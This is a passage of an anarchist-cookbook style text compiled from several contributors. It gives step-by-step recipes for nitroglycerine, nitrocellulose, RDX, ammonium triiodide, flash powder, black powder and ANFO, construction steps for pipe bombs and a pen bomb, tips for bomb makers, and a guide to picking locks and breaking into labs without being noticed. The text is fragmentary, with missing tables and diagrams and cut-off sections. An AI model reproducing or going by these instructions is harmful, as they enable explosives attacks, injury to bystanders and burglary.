pressure to the powder through the spoon and rub it in a series of strokes or
circles, but not too hard.  It is fine enough to use when it is about as fine
as flour.  The fineness, however, is dependant on what type of device one
wishes to make; obviously, it would be impracticle to crush enough powder to
fill a 1 foot by 4 inch radius pipe.  Any adult can purchase black powder,
since anyone can own black powder firearms in the United States.


                                PYRODEX

     Pyrodex is a synthetic powder that is used like black powder.  It comes
in the same grades, but it is more expensive per pound.  However, a one pound
container of pyrodex contains more material by volume than a pound of black
powder.  It is much easier to crush to a very fine powder than black powder,
and it is considerably safer and more reliable.  This is because it will not
be set off by static electricity, as black can be, and it is less inclined to
absorb moisture.  It costs about $10.00 per pound.  It can be crushed in the
same manner as black powder, or it can be dissolved in boiling water and
dried.


                        ROCKET ENGINE POWDER

     One of the most exciting hobbies nowadays is model rocketry.  Estes is
the largest producer of model rocket kits and engines.  Rocket engines are
composed of a single large grain of propellant.  This grain is surrounded by a
fairly heavy cardboard tubing.  One gets the propellant by slitting the tube
length- wise, and unwrapping it like a paper towel roll.  When this is done,
the gray fire clay at either end of the propellant grain must be removed.
This is usually done gently with a plastic or brass knife. The material is
exceptionally hard, and must be crushed to be used.  By gripping the grain in
the widest setting on a set of pliers, and putting the grain and powder in a
plastic bag, the powder will not break apart and shatter all over.  This
should be done to all the large chunks of powder, and then it should be
crushed like black powder. Rocket engines come in various sizes, ranging from
1/4 A - 2T to the incredibly powerful D engines.  The larger the engine, the
more expensive.  D engines come in packages of three, and cost about $5.00 per
package.  Rocket engines are perhaps the single most useful item sold in
stores to a terrorist, since they can be used as is, or can be cannibalized
for their explosive powder.

                       
                        RIFLE/SHOTGUN POWDER

     Rifle powder and shotgun powder are really the same from a practicle
standpoint. They are both nitrocellulose based propellants. They will be
referred to as gunpowder in all future references. Smokeless gunpowder is made
by the action of concentrated nitric and sulfuric acid upon cotton or some
other cellulose material. This material is then dissolved by solvents and then
reformed in the desired grain size.  When dealing with smokeless gunpowder,
the grain size is not nearly as important as that of black powder. Both large
and small grained smokeless powder burn fairly slowly compared to black powder
when unconfined, but when it is confined, gunpowder burns both hotter and with
more gaseous expansion, producing more pressure. Therefore, the grinding
process that is often necessary for other propellants is not necessary for
smokeless powder. owder costs about $9.00 per pound. In most states any
citizen with a valid driver's license can buy it, since there are currently
few restrictions on rifles or shotguns in the U.S. There are now ID checks in
many states when purchasing powder at a retail outlet.  Mail-orders aren't
subject to such checks.  Rifle powder and pyrodex may be purchased by mail
order, but UPS charges will be high, due to DOT regulations on packaging.

                              LOCKPICKING 3

     If it becomes necessary to pick a lock to enter a lab, the world's most
effective lockpick is dynamite, followed by a sledgehammer.  There are
unfortunately, problems with noise and excess structural damage with these
methods. The next best thing, however, is a set of professional lockpicks.

These, unfortunately, are difficult to acquire. If the door to a lab is locked,
but the deadbolt is not engaged, then there are other possibilities. The rule
here is: if one can see the latch, one can open the door. There are several
devices which facilitate freeing the latch from its hole in the wall. Dental
tools, stiff wire ( 20 gauge ), specially bent aluminum from cans, thin
pocket knives, and credit cards are the tools of the trade. The way that all
these tools and devices are uses is similar: pull, push, or otherwise move the
latch out of its recess in the wall, thus allowing the door to open. This is
done by sliding whatever tool that you are using behind the latch, and forcing
the latch back into the door.

Most modern doorknob locks have two fingers. The larger finger holds the door
closed while the second (smaller) finger only prevents the first finger from
being pressed in when it (the second finger) is pressed in by the catchplate
of the door.  If you can separate the catch plate and the lock sufficiently
far, the second finger will slip out enough to permit the first finger to be
slipped.

   Small   ->   (|   }   <--- The large (first) finger
   second        |___}   <
   finger

Some methods for getting through locked doors are:

  1) Another method of forced entry is to use an automobile jack to force the
     frame around the door out of shape, freeing the latch or exposing it to
     the above methods. This is possible because most door frames are designed
     with a slight amount of "give". Simply put the jack into position
     horizontally across the frame in the vicinity of the latch, and jack it
     out. If the frame is wood it may be possible to remove the jack after
     shutting the door, which will relock the door and leave few signs of
     forced entry. This technique will not work in concrete block buildings,
     and it's difficult to justify an auto jack to the security guards.
  2) use a screwdriver or two to pry the lock and door apart.  While holding
     them apart, try to slip the lock.  Screwdrivers, while not entirely
     innocent, are much more subtle than auto jacks, and much faster if they
     work.  If you're into unsubtle, I suppose a crowbar would work too, but
     then why bother to slip the lock at all?
  3) Find a set of double doors.  They are particularly easy to pry apart far
     enough to slip.
  4) If the lock is occasionally accessible to you while open, "adjust" or
     replace the catchplate to make it operate more suitably (i.e., work so
     that it lets *both* fingers out, so that it can always be slipped).  If
     you want, disassembling the lock and removing some of the pins can make
     it much easier to pick.
  5) If, for some odd reason, the hinges are on your side (i.e., the door
     opens outward), remove the hinge pins (provided they aren't stopped with
     welded tabs).  Unfortunately, this too lacks subtlety, in spite of its
     effectiveness.
  6) If the door cannot be slipped and you will want to get through regularly,
     break the mechanism.  Use of sufficient force to make the first finger
     retreat while the second finger is retreated will break some locks (e.g.,
     Best locks) in such a way that they may thereafter be slipped trivially,
     yet otherwise work in all normal ways.  Use of a hammer and/or
     screwdriver is recommended. Some care should be used not to damage the
     door jamb when attempting this on closed and locked doors, so as not to
     attract the attention of the users/owners/locksmith/police/....
  7) Look around in desks.  People very often leave keys to sensitive things
     in them or other obvious places.  Especially keys to shared critical
     resources, like supply rooms, that are typically key-limited but that
     everyone needs access to.  Take measurements with a micrometer, or make a
     tracing (lay key under paper and scribble on top), or be dull and make a
     wax impression.  Get blanks for the key type (can be very difficult for
     better locks; I won't go into methods, other than to say that if you can
     get other keys made from the same blank, you can often work wonders with
     a little ingenuity) and use a file to reproduce the key.  Using a
     micrometer works best:  keys made from mic measurements are more likely
     to work consistently than keys made by any other method.  If you us
     tracings, it is likely to take many tries before you obtain a key that
     works reliably.  Also, if you can 'borrow' the cylinder and disassemble
     it, pin levels can be obtained and keys constructed.
  8) Simple locks, like desks, can be picked fairly easily.  Many desks have
     simple three or four pin locks of only a few levels, and can be
     consistently picked by a patient person in a few minutes.  A small
     screwdriver and a paper clip will work wonders in practiced hands.  Apply
     a slight torque to the lock in the direction of opening with the
     screwdriver.  Then 'rake' the pins with the unfolded paper clip.  With
     practice, you'll apply enough pressure with the screwdriver that the pins
     will align properly (they'll catch on the cylinder somewhere between the
     top and bottom of their normal travel), and once they're all lined up,
     additional pressure on the screwdriver will then open the lock.  This, in
     conjunction with (7) can be very effective.  This works better with older
     or sloppily machined locks that have a fair amount of play in the
     cylinder.  Even older quality locks can be picked in this manner, if
     their cylinders have been worn enough to give enough play to allow pins
     to catch reliably. Even with a well worn quality lock, though, it
     generally takes a *lot* of patience.
  9) Custodial services often open up everything in sight and then take
     breaks.  Make the most of your opportunities.
 10) No matter what you're doing, look like you belong there.  Nothing makes
     anyone more suspicious than someone skulking about, obviously trying to
     look inconspicuous.  If there are several of you, have some innocuous and
     normal seeming warning method ("Hey, dummy!  What time is it?") so that
     they can get anything suspicious put away.  Don't travel in large groups
     at 3 AM.  Remember, more than one car thief has managed to enlist a cop's
     aid in breaking into a car.  Remember this.  Security people usually
     *like* to help people.  Don't make them suspicious or annoy them.  If you
     do run into security people, try to make sure that there won't be any
     theft or break-ins reported there the next day...
 11) Consider the possibilities of master keys.  Often, every lock in a
     building or department will have a common master (building entrance keys
     are a common exception).  Take apart some locks from different places
     that should have common masters, measure the different pin lengths in
     each, and find lengths in common.  Experiment.  Then get into those
     places you're *really* curious about.
 12) Control keys are fun, too.  These keys allow the user to remove the
     lock's core, and are generally masters.  (A pair of needle nose pliers or
     similar tool can then be used to open the lock, if desired.)


                           SLIPPING A LOCK

     The best material we've found for slips so far is soft sheet copper.  It
is quite flexible, so it can be worked into jambs easily, and can be pre-bent
as needed.  In the plane of the sheet, however, it is fairly strong, and pulls
nicely.  Of course, if they're flexible enough, credit cards, student IDs,
etc., work just fine on locks that have been made slippable if the door jamb
is wide enough.  Wonderfully subtle, quick, and delightfully effective.  Don't
leave home without one.

The sheet should then be folded to produce an L,J,or U shaped device that
looks like this:

We hasten to add here that many or most colleges and universities
have very strict policies about unauthorized possession of keys.  At
most, it is at least grounds for expulsion, even without filing criminal
charges.  Don't get caught with keys!!!  The homemade ones are
particularly obvious, as they don't have the usual stamps and marks
that the locksmiths put on to name and number the keys.]

we should also point out that if you make a nuisance of yourself, there are
various nasty things that can be done to catch you and/or slow you down.  For
instance, by putting special pin mechanisms in, locks can be made to trap any
key used to open them.  If you lose one this way, what can I say?  At least

much mischief can also tempt the powers that be to rekey.

        LIST OF USEFUL HOUSEHOLD CHEMICALS AND THEIR AVAILABILITY

     Anyone can get many chemicals from hardware stores, supermarkets, and
drug stores to get the materials to make explosives or other dangerous
compounds.  A would-be terrorist would merely need a station wagon and some
money to acquire many of the chemicals named here.

NITROGLYCERINE

     Nitroglycerine is one of the most sensitive explosives, if it is not the
most sensitive.  Although it is possible to make it safely, it is difficult.
Many a young anarchist has been killed or seriously injured while trying to
make the stuff.  When Nobel's factories make it, many people were killed by
the all-to-frequent factory explosions.  Usually, as soon as it is made, it is
converted into a safer substance, such as dynamite.  An idiot who attempts to
make nitroglycerine would use the following procedure:

     MATERIAL               EQUIPMENT
                    
     distilled water        eye-dropper

     table salt             100 ml beaker

     sodium bicarbonate     200-300 ml beakers (2)

     concentrated nitric    ice bath container
     acid (13 ml)           ( a plastic bucket serves well )

     concentrated sulfuric  centigrade thermometer
     acid (39 ml)

     glycerine              blue litmus paper


1)  Place 150 ml of distilled water into one of the 200-300 ml beakers.

2)  In the other 200-300 ml beaker, place 150 ml of distilled water and about
   a spoonful of sodium bicarbonate, and stir them until the sodium
   bicarbonate dissolves.  Do not put so much sodium bicarbonate in the water
   so that some remains undissolved.

3)  Create an ice bath by half filling the ice bath container with ice, and
   adding table salt.  This will cause the ice to melt, lowering the overall
   temperature.

4)  Place the 100 ml beaker into the ice bath, and pour the 13 ml of
   concentrated nitric acid into the 100 ml beaker.  Be sure that the beaker
   will not spill into the ice bath, and that the ice bath will not overflow
   into the beaker when more materials are added to it.  Be sure to have a
   large enough ice bath container to add more ice.  Bring the temperature of
   the acid down to about 20 degrees centigrade or less.

5)  When the nitric acid is as cold as stated above, slowly and carefully add
   the 39 ml of concentrated sulfuric acid to the nitric acid.  Mix the two
   acids together, and cool the mixed acids to 10 degrees centigrade.  It is a
   good idea to start another ice bath to do this.

6)  With the eyedropper, slowly put the glycerine into the mixed acids, one
   drop at a time.  Hold the thermometer along the top of the mixture where
   the mixed acids and glycerine meet.

      DO NOT ALLOW THE TEMPERATURE TO GET ABOVE 30 DEGREES CENTIGRADE; IF
        THE TEMPERATURE RISES ABOVE THIS TEMPERATURE, WATCH OUT !!

   The glycerine will start to nitrate immediately, and the temperature will
immediately begin to rise.  Add glycerine until there is a thin layer of
glycerine on top of the mixed acids.  It is always safest to make any
explosive in small quantities.

7)  Stir the mixed acids and glycerine for the first ten minutes of nitration,
   adding ice and salt to the ice bath to keep the temperature of the solution
   in the 100 ml beaker well below 30 degrees centigrade.  Usually, the
   nitroglycerine will form on the top of the mixed acid solution, and the
   concentrated sulfuric acid will absorb the water produced by the reaction.

8)  When the reaction is over, and when the nitroglycerine is well below 30
   degrees centigrade, slowly and carefully pour the solution of
   nitroglycerine and mixed acid into the distilled water in the beaker in
   step 1.  The nitroglycerine should settle to the bottom of the beaker, and
   the water-acid solution on top can be poured off and disposed of. Drain as
   much of the acid- water solution as possible without disturbing the
   nitroglycerine.

9)  Carefully remove the nitroglycerine with a clean eye-dropper, and place it
   into the beaker in step 2.  The sodium bicarbonate solution will eliminate
   much of the acid, which will make the nitroglycerine more stable, and less
   likely to explode for no reason, which it can do.  Test the nitroglycerine
   with the litmus paper until the litmus stays blue.  Repeat this step if
   necessary, and use new sodium bicarbonate solutions as in step 2.

10) When the nitroglycerine is as acid-free as possible, store it in a clean
   container in a safe place.  The best place to store nitroglycerine is far
   away from anything living, or from anything of any value. Nitroglycerine
   can explode for no apparent reason, even if it is stored in a secure cool
   place.

PRODUCING CELLULOSE NITRATE   (From andrew at CMU)

 I used to make nitrocellulose, though. It was not guncotton grade, because I
didn't have oleum (H2SO4 with dissolved SO3); nevertheless it worked. At first
I got my H2SO4 from a little shop in downtown Philadelphia, which sold
soda-acid fire extinguisher refills. Not only was the acid concentrated, cheap
and plentiful, it came with enough carbonate to clean up. I'd add KNO3 and a
little water (OK, I'd add the acid to the water - but there was so little
water, what was added to what made little difference. It spattered
concentrated H2SO4 either way). Later on, when I could purchase the acids, I
believe I used 3 parts H2SO4 to 1 part HNO3. For cotton, I'd use cotton wool
or cotton cloth.

 Runaway nitration was commonplace, but it is usually not so disasterous with
nitrocellulose as it is with nitroglycerine. For some reason, I tried washing
the cotton cloth in a solution of lye, and rinsing it well in distilled water.
I let the cloth dry and then nitrated it. (Did I read this somewhere?) When
that product was nitrated, I never got a runaway reaction. BTW, water quenched
the runaway reaction of cellulose.

The product was washed thoroughly and allowed to dry. It dissolved (or turned
into mush) in acetone. It dissolved in alcohol/ether.

                                   WARNINGS

 All usual warnings regarding strong acids apply. H2SO4 likes to spatter. When
it falls on the skin, it destroys tissue - often painfully. It dissolves all
manner of clothing. Nitric also destroys skin, turning it bright yellow in the
process. Nitric is an oxidant - it can start fires. Both agents will happily
blind you if you get them in your eyes. Other warnings also apply. Not for the
novice.

 Nitrocellulose decomposes very slowly on storage if it isn't stablized. The
decomposition is auto- catalyzing, and can result in spontaneous explosion if
the material is kept confined over time. The process is much faster if the
material is not washed well enough. Nitrocellulose powders contain stabilizers
such as diphenyl amine or ethyl centralite. DO NOT ALLOW THESE TO COME INTO
CONTACT WITH NITRIC ACID!!!! A small amount of either substance will capture
the small amounts of nitrogen oxides that result from decomposition. They
therefore inhibit the autocatalysis. NC eventually will decompose in any case.

Again, this is inherently dangerous and illegal in certain areas. I got away
with it. You may kill yourself and others if you try it.

Commercially produced Nitrocellulose is stabilized by:
------------------------------------------------------


1. Spinning it in a large centrifuge to remove the remaining acid, which is
   recycled.

2. Immersion in a large quantity of fresh water.

3. Boiling it in acidulated water and washing it thoroughly with fresh water.

   If the NC is to be used as smokeless powder it is boiled in a soda solution,
then rinsed in fresh water.

   The purer the acid used (lower water content) the more complete the
nitration will be, and the more powerful the nitrocellulose produced.

   There are actually three forms of cellulose nitrate, only one of which is
useful for pyrotechnic purposes. The mononitrate and dinitrate are not
explosive, and are produced by incomplete nitration. If nitration is allowed
to proceed to complete the explosive trinatrate is formed.

FUEL-OXODIZER MIXTURES -- (AKA: Starter Explosives)

     There are nearly an infinite number of fuel-oxodizer mixtures that can be
produced by a misguided individual in his own home.  Some are very effective
and dangerous, while others are safer and less effective.  A list of working
fuel- oxodizer mixtures will be presented, but the exact measurements of each
compound are debatable for maximum effectiveness.  A rough estimate will be

NOTE: Mixtures that uses substitutions of sodium perchlorate for potassium      
perchlorate become moisture-absorbent and less stable.

     The higher the speed number, the faster the fuel-oxodizer mixture burns
AFTER ignition.  Also, as a rule, the finer the powder, the faster the rate of
burning.

     As one can easily see, there is a wide variety of fuel-oxodizer mixtures
that can be made at home.  By altering the amounts of fuel and oxodizer(s),
different burn rates can be achieved, but this also can change the sensitivity
of the mixture.

FLASH POWDER      (By Dr. Tiel)

Here are a few basic precautions to take if you're crazy enough to produce
your own flash powder:

(1) Grind the oxidizer (KNO3, KClO3, KMnO4, KClO4 etc) separately in a
     clean vessel.

(2) NEVER grind or sift the mixed composition.

(3) Mix the composition on a large paper sheet, by rolling the composition
    back and forth.

(4) Do not store flash compositions, especially any containing Mg.

(5) Make very small quantities at first, so you can appreciate the power
    of such mixtures.

        KNO3  50%     (by weight)
        Mg    50%

   It is very important to have the KNO3 very dry, if evolution of ammonia is
observed then the KNO3 has water in it.  Very pure and dry KNO3 is needed.

   KClO3 with Mg or Al metal powders works very well.  Many hands, faces and
lives have been lost with such compositions.

KMnO4 with Mg or Al is also an extremely powerful flash composition.

KClO4 with Al is generally found in comercial fireworks, this does not
mean that it is safe, it is a little safer than KClO3 above.

K2Cr2O7 can also be used as an oxidizer for flash powder.

The finer the oxidizer and the finer the metal powder the more powerful the
explosive.  This of course will also increase the sensetivity of the flash
powder.

For a quick flash small quantities can be burnt in the open.
Larger quantities (50g or more)  ignited in the open can detonate, they do not
need a container to do so.

NOTE:   Flash powder in any container will detonate.

Balanced equations of some oxidizer/metal reactions. Only major products
are considered.  Excess metal powders are generally used.  This excess
burns with atmospheric oxygen.

4 KNO3 + 10 Mg  -->  2 K2O + 2 N2 + 10 MgO + energy

KClO3 + 2 Al  -->  KCl + Al2O3 + energy

3 KClO4 + 8 Al  -->  3 KCl + 4 Al2O3 + energy

6 KMnO4 + 14 Al  -->  3 K2O + 7 Al2O3 + 6 Mn + energy

 4] 1 Match stick
 5] a sheet of sand paper (1 1/2" X 2")

1] Unscrew pen and remove all parts but leave the button in the top.
2] Stick the match stick in the part of the pen clicker where the other little
  parts and the ink fill was.
3] Roll sand paper up and put around the match stick that is in the clicker.
4] Put the remaining Match Heads inside the pen, make sure that they are on
   the inside on the sand paper.
5] Put a small piece of paper or something in the other end of the pen where
  the ball point comes out.
6] Fill the end with the piece of paper in it with gun powder.  The paper is
  to keep the powder from spilling.

The Finished pen should look like this:

PIPE BOMBS FROM SOFT METAL PIPES                           Mondain


   First, one flattens one end of a copper or aluminum pipe carefully, making
sure not to tear or rip the piping.  Then, the flat end of the pipe should be
folded over at least once, if this does not rip the pipe.  A fuse hole should
be drilled in the pipe near the now closed end, and the fuse should be
inserted.

    Next, the bomb- builder would partially fill the casing with a low order
explosive, and pack it with a large wad of tissue paper.  He would then
flatten and fold the other end of the pipe with a pair of pliers.  If he was
not too dumb, he would do this slowly, since the process of folding and
bending metal gives off heat, which could set off the explosive.  A diagram is
presented below:

SAFETY TIPS --  HOW NOT TO GET KILLED   (Ways to avoid scoring an "Own Goal")

        An "own goal" is the death of a person on your side from one of
your own devices. It is obvious that these should be avoided at all
costs. While no safety device is 100% reliable, it is usually better to
err on the side of caution.

                           BASIC SAFETY RULES

1) DON'T SMOKE!  (don't laugh- an errant cigarette wiped out the Weathermen)
2) GRIND ALL INGREDIENTS SEPERATELY. It's suprising how friction sensitive
    some supposedly "safe" explosives really are.
3) ALLOW for a 20% margin of error- Just because the AVERAGE burning rate of a
    fuse is 30 secs/foot, don't depend on the 5 inches sticking out of your
    pipe bomb to take exactly 2.5 minutes.
4) OVERESTIMATE THE RANGE OF YOUR SHRAPNEL. The cap from a pipe bomb can
    oftentravel a block or more at high velocities before coming to rest- If
    you have to stay nearby, remember that if you can see it, it can kill you.
5) When mixing sensitive compounds (such as flash powder) avoid all sources of
   static electricity. Mix the ingredients by the method below:

                       HOW TO MIX INGREDIENTS 

     The best way to mix two dry chemicals to form an explosive is to do as
the small-scale fireworks manufacturer's do:

Ingredients:

1 large sheet of smooth paper (for example a page from a newspaper that does
    not use staples)

The dry chemicals needed for the desired compound.

1) Measure out the appropriate amounts of the two chemicals, and pour them in
    two small heaps near opposite corners of the sheet.
2) Pick up the sheet by the two corners near the powders, allowing the powders
    to  roll towards the middle of the sheet.
3) By raising one corner and then the other, roll the powders back and forth
    in the middle of the open sheet, taking care not to let the mixture spill
    from either of the loose ends.
4) Pour the powder off from the middle of the sheet, and use immediately. If
    it must be stored use airtight containers (35mm film canisters work
    nicely) and store away from people, houses, and valuable items.

  AMMONIUM TRIIODIDE CRYSTALS

     Ammonium triiodide crystals are foul-smelling purple colored crystals
that decompose under the slightest amount of heat, friction, or shock, if they
are made with the purest ammonia (ammonium hydroxide) and iodine.  Such
crystals are said to detonate when a fly lands on them, or when an ant walks
across them. Household ammonia, however, has enough impurities, such as soaps
and abrasive agents, so that the crystals will detonate when thrown,crushed,
or heated. Ammonia, when bought in stores comes in a variety of forms.  The
pine and cloudy ammonias should not be bought; only the clear ammonia should
be used to make ammonium triiodide crystals. Upon detonation, a loud report is
heard, and a cloud of purple iodine gas appears about the detonation site.
Whatever the unfortunate surface that the crystal was detonated upon will
usually be ruined, as some of the iodine in the crystal is thrown about in a
solid form, and iodine is corrosive.  It leaves nasty, ugly, permanent
brownish-purple stains on whatever it contacts. Iodine gas is also bad news,
since it can damage lungs, and it settles to the ground and stains things
there also.  Touching iodine leaves brown stains on the skin that last for
about a week, unless they are immediately and vigorously washed off.  While
such a compound would have little use to a serious terrorist, a vandal could
utilize them in damaging property.  Or, a terrorist could throw several of
them into a crowd as a distraction, an action which would possibly injure a
few people, but frighten almost anyone, since a small crystal that may not be
seen when thrown produces a rather loud explosion.

    Ammonium triiodide crystals could be produced in the following manner:

     Materials                Equipment
                     
     iodine crystals          funnel and filter paper
                              paper towels
     clear ammonia
     (ammonium hydroxide,     two throw-away glass jars
      for the suicidal)

1) Place about two teaspoons of iodine into one of the glass jars.  The jars
   must both be throw away because they will never be clean again.

2) Add enough ammonia to completely cover the iodine.

3) Place the funnel into the other jar, and put the filter paper in the
   funnel. The technique for putting filter paper in a funnel is taught in
   every basic chemistry lab class: fold the circular paper in half, so that a
   semi-circle is formed.  Then, fold it in half again to form a triangle with
   one curved side.  Pull one thickness of paper out to form a cone, and place
   the cone into the funnel.

4) After allowing the iodine to soak in the ammonia for a while, pour the
   solution into the paper in the funnel through the filter paper.

5) While the solution is being filtered, put more ammonia into the first jar
   to wash any remaining crystals into the funnel as soon as it drains.

6) Collect all the purplish crystals without touching the brown filter paper,
   and place them on the paper towels to dry for about an hour.  Make sure
   that they are not too close to any lights or other sources of heat, as they
   could well detonate. While they are still wet, divide the wet material into
   eight pieces of about the same size.

7) After they dry, gently place the crystals onto a one square inch piece of
   duct tape.  Cover it with a similar piece, and gently press the duct tape
   together around the crystal, making sure not to press the crystal itself.
   Finally, cut away most of the excess duct tape with a pair of scissors, and
   store the crystals in a cool dry safe place.  They have a shelf life of
   about a week, and they should be stored in individual containers that can
   be thrown away, since they have a tendency to slowly decompose, a process
   which  gives off iodine vapors, which will stain whatever they settle on.
   One possible way to increase their shelf life is to store them in airtight
   containers.  To use them, simply throw them against any surface or place
   them where they will be stepped on or crushed.

    SULFURIC ACID                                     by Mondain

     Sulfuric acid is far too difficult to make outside of a laboratory or
industrial plant.  However, it is readily available in an uncharged car
battery. A person wishing to make sulfuric acid would simply remove the top of
a car battery and pour the acid into a glass container.  There would probably
be pieces of lead from the battery in the acid which would have to be removed,
either by boiling or filtration.  The concentration of the sulfuric acid can
also be increased by boiling it; very pure sulfuric acid pours slightly faster
than clean motor oil.


   AMMONIUM NITRATE

     Ammonium nitrate is a very powerful but insensitive high-order explosive.
It could be made very easily by pouring nitric acid into a large flask in an ice
bath. Then, by simply pouring household ammonia into the flask and running away,
ammonium nitrate would be formed. After the materials have stopped reacting, one
would simply have to leave the solution in a warm place until all of the water
and any unneutralized ammonia or acid have evaporated. There would be a fine
powder formed, which would be ammonium nitrate. It must be kept in an airtight
container, because of its tendency to pick up water from the air.  The crystals
formed in the above process would have to be heated VERY gently to drive off the
remaining water.

    BLACK POWDER 3

     First made by the Chinese for use in fireworks, black powder was first
used in weapons and explosives in the 12th century.  It is very simple to
make, but it is not very powerful or safe.  Only about 50% of black powder is
converted to hot gasses when it is burned; the other half is mostly very fine
burned particles.  Black powder has one major problem: it can be ignited by
static electricity.  This is very bad, and it means that the material must be
made with wooden or clay tools.  Anyway, a misguided individual could
manufacture black powder at home with the following procedure:

     MATERIALS               EQUIPMENT
                    
     potassium               clay grinding bowl
     nitrate (75 g)          and clay grinder

       or                         or

     sodium                  wooden salad bowl
     nitrate (75 g)          and wooden spoon

     sulfur (10 g)           plastic bags (3)

     charcoal (15 g)         300-500 ml beaker (1)

     distilled water         coffee pot or heat source



1) Place a small amount of the potassium or sodium nitrate in the grinding
 bowl and grind it to a very fine powder.  Do this to all of the potassium or
 sodium nitrate, and store the ground powder in one of the plastic bags.

2) Do the same thing to the sulfur and charcoal, storing each chemical in a
separate plastic bag.

3) Place all of the finely ground potassium or sodium nitrate in the beaker,
   and add just enough boiling water to the chemical to get it all wet.

4) Add the contents of the other plastic bags to the wet potassium or sodium
nitrate, and mix them well for several minutes.  Do this until there is no
more visible sulfur or charcoal, or until the mixture is universally black.

5) On a warm sunny day, put the beaker outside in the direct sunlight.
  Sunlight is really the best way to dry black powder, since it is never too
  hot, but it is hot enough to evaporate the water.

6) Scrape the black powder out of the beaker, and store it in a safe
 container. Plastic is really the safest container, followed by paper.  Never
 store black powder in a plastic bag, since plastic bags are prone to generate
 static electricity.

  NITROCELLULOSE                              -= Mondain =-

     Nitrocellulose is usually called "gunpowder" or "guncotton".  It is more
stable than black powder, and it produces a much greater volume of hot gas.  It
also burns much faster than black powder when it is in a confined space.
Finally, nitrocellulose is fairly easy to make, as outlined by the following
procedure:


     MATERIALS                    EQUIPMENT
                         
     cotton  (cellulose)          two (2) 200-300 ml beakers

     concentrated                 funnel and filter paper
     nitric acid
                                  blue litmus paper
     concentrated
     sulfuric acid

     distilled water



1) Pour 10 cc of concentrated sulfuric acid into the beaker.  Add to this    10
cc of concentrated nitric acid.

2) Immediately add 0.5 gm of cotton, and allow it to soak for exactly 3   
minutes.

3) Remove the nitrocotton, and transfer it to a beaker of distilled water    to
wash it in.

4) Allow the material to dry, and then re-wash it.

5) After the cotton is neutral when tested with litmus paper, it is ready to   
be dried and stored.

    R.D.X. 2

     R.D.X., also called cyclonite, or composition C-1 (when mixed with
plasticisers) is one of the most valuable of all military explosives.  This is
because it has more than 150% of the power of T.N.T., and is much easier to
detonate.  It should not be used alone, since it can be set off by a not-too
severe shock.  It is less sensitive than mercury fulminate, or nitroglycerine,
but it is still too sensitive to be used alone.

                           2

 R.D.X. can be made by the surprisingly simple method outlined hereafter.  It
is much easier to make in the home than all other high explosives, with the
possible exception of ammonium nitrate.

     MATERIALS                    EQUIPMENT
                         
     hexamine                     500 ml beaker
       or
     methenamine                  glass stirring rod
     fuel tablets (50 g)
                                  funnel and filter paper
     concentrated
     nitric acid (550 ml)         ice bath container  (plastic bucket)

     distilled water              centigrade thermometer

     table salt                   blue litmus paper

     ice                          ammonium nitrate


1) Place the beaker in the ice bath, (see section 3.13, steps 3-4) and carefully 
   pour 550 ml of concentrated nitric acid into the beaker.

2) When the acid has cooled to below 20 degrees centigrade, add small amounts
   of the crushed fuel tablets to the beaker.  The temperature will rise, and
   it must be kept below 30 degrees centigrade, or dire consequences could
   result. Stir the mixture.

3) Drop the temperature below zero degrees centigrade, either by adding more
   ice and salt to the old ice bath, or by creating a new ice bath.  Or,
   ammonium nitrate could be added to the old ice bath, since it becomes cold
   when it is put in water. Continue stirring the mixture, keeping the
   temperature below zero degrees centigrade for at least twenty minutes

4) Pour the mixture into a litre of crushed ice.  Shake and stir the mixture,
   and allow it to melt.  Once it has melted, filter out the crystals, and
   dispose of the corrosive liquid.

5) Place the crystals into one half a litre of boiling distilled water. Filter
   the crystals, and test them with the blue litmus paper.  Repeat steps 4 and
   5 until the litmus paper remains blue.  This will make the crystals more
   stable and safe.

6) Store the crystals wet until ready for use. Allow them to dry completely
    using them. R.D.X. is not stable enough to use alone as an explosive.

7) Composition C-1 can be made by mixing 88.3% R.D.X. (by weight) with 11.1%
   mineral oil, and 0.6% lecithin. Kneed these material together in a plastic
   bag. This is one way to desensitize the explosive.

8) H.M.X. is a mixture of T.N.T. and R.D.X.; the ratio is 50/50, by weight.   
  it is not as sensitive, and is almost as powerful as straight R.D.X.

9) By adding ammonium nitrate to the crystals of R.D.X. after step 5, it
   should be possible to desensitize the R.D.X. and increase its power, since
   ammonium nitrate is very insensitive and powerful. Soduim or potassium
   nitrate could also be added; a small quantity is sufficient to stabilize
   the R.D.X.

10) R.D.X. detonates at a rate of 8550 meters/second when it is compressed to a  
   density of 1.55 g/cubic cm.

     ANFOS

     ANFO is an acronym for Ammonium Nitrate - Fuel Oil Solution.  An ANFO
solves the only other major problem with ammonium nitrate: its tendency to
pick up water vapor from the air.  This results in the explosive failing to
detonate when such an attempt is made.  This is rectified by mixing 94% (by
weight) ammonium nitrate with 6% fuel oil, or kerosene.  The kerosene keeps
the ammonium nitrate from absorbing moisture from the air.  An ANFO also
requires a large shockwave to set it off.


     About ANFO            (From Dean S.)

  Lately there was been a lot said about various ANFO mixtures.  These are
mixtures of Ammonium Nitrate with Fuel Oil.  This forms a reasonably powerful
commercial explosive, with its primary benifit being the fact that it is
cheap.  Bulk ANFO should run somewhere around 9-12 cents the pound. This is
dirt cheap compared to 40% nitro gel dynamites at 1 to 2 dollars the pound. To
keep the cost down, it is frequently mixed at the borehole by a bulk truck,
which has a pneumatic delivery hopper of AN prills (thats pellets to most of
the world) and a tank of fuel oil.  It is strongly recommended that a dye of
some sort, preferably red be added to the fuel oil to make it easier to
distinguish treated AN explosive from untreated oxidizer.

   ANFO is not without its problems.  To begin with, it is not that sensitive
to detonation.  Number eight caps are not reliable when used with ANFO.
Booster charges must be used to avoid dud blast holes.  Common boosters
include sticks of various dynamites, small pours of water gel explosives,
dupont's detaprime cast boosters, and Atlas's power primer cast explosive. The
need to use boosters raises the cost.  Secondly, ANFO is very water
susceptable.  It dissolves in it, or absorbes it from the atmosphere, and
becomes quite worthless real quick.  It must be protected from water with
borehole liners, and still must be shot real quick.  Third, ANFO has a low
density, somewhere around .85.  This means ANFO sacks float, which is no good,
and additionally, the low density means the power is somewhat low. Generally,
the more weight of explosive one can place in a hole, the more effective.
ANFO blown into the hole with a pneumatic system fractures as it is places,
raising the density to about .9 or .92.  The delivery system adds to the cost,
and must be anti static in nature.  Aluminum is added to some commercial,
cartridge packaged ANFOs to raise the density---this also raises power
considerable, and a few of these mixtures are reliablly cap sensitive.

  Now than, for formulations.  An earlier article mentioned 2.5 kilos of
ammonium nitrate, and I believe 5 to 6 liters of diesel.  This mixture is
extremely over fueled, and I'd be surprised if it worked.  Dupont recommends a
AN to FO ratio of 93% AN to 7% FO by weight.  Hardly any oil at all.  More oil
makes the mixture less explosive by absorbing detonation energy, and excess
